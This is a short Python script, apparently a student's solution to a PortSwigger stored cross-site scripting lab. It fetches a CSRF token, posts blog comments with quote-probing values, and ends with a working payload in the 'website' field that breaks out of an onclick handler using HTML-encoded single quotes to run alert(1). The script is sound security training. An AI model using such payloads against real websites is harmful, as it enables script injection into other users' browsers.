"""
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

def try_post(name, website_link):
    blog_post_url = f'https://{site}/post?postId=1'
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    comment_url = f'https://{site}/post/comment'
    comment_data = {
        'csrf' : csrf,
        'postId' : '1',
        'comment' : 'Hello world!',
        'name' : name,
        'email' : 'baa@pdx.edu',
        'website': website_link
    }

    resp = s.post(comment_url, data=comment_data)

#try_post("single quote","https://pdx.edu/'")
#try_post("double quote",'https://pdx.edu/"')
#try_post("double quote HTML encoded",'https://pdx.edu/&quot;')
#try_post("single quote HTML encoded",'https://pdx.edu/&apos;')
try_post("exploit",'https://pdx.edu/&apos; -alert(1)-&apos;')